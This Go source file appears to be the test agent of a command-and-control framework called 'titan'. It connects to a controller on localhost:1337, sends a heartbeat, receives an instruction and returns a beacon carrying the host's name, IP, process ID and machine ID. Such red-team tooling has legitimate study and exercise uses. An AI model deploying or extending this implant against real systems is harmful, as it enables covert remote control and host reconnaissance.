package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"github.com/BradHacker/titan/models"
	"github.com/denisbrodbeck/machineid"
)

func main() {
	connection, err := CreateTCPConnection("localhost", "1337")
	if err != nil {
		log.Fatal(fmt.Errorf("couldn't establish connection: %v", err))
	}

	defer CloseConnection(connection)

	err = SendHeartbeat(GenerateHeartbeat(connection), connection)
	if err != nil {
		log.Fatal(fmt.Errorf("error while generating heartbeat: %v", err))
	}

	instruction, err := WaitForInstruction(connection)
	if err != nil {
		log.Fatal(fmt.Errorf("error while waiting for instruction: %v", err))
	}

	testBeacon := generateTestBeacon(instruction, connection)
	time.Sleep(1000)

	err = SendBeacon(testBeacon, connection)
	if err != nil {
		log.Fatal(fmt.Errorf("couldn't send beacon: %v", err))
	}
}

func generateTestBeacon(instruction models.Instruction, connection net.Conn) (beacon models.Beacon) {
	var testAgent models.Agent

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	testAgent.Hostname = hostname
	localAaddressParts := strings.Split(connection.LocalAddr().String(), ":")
	testAgent.IP = localAaddressParts[0]
	testAgent.PID = GetProcessID()
	testAgent.Port = localAaddressParts[1]
	// uuidHasher := sha256.New()
	// macs, err := GetMACAddrs()
	// if err != nil {
	// 	macs = []string{"00:00:00:00:00:00"}
	// }
	// testAgent.UUID = uuidHasher.Sum(nil)
	macId, err := machineid.ID();
	if err != nil {
		fmt.Println(fmt.Errorf("error getting machine ID: %v", err))
	} else {
		testAgent.UUID = macId
	}

	modifiedInstruction := HandleInstruction(instruction)

	modifiedInstruction.Agent = testAgent
	
	beacon.Instruction = modifiedInstruction
	beacon.ReceivedAt = time.Now()
	return
}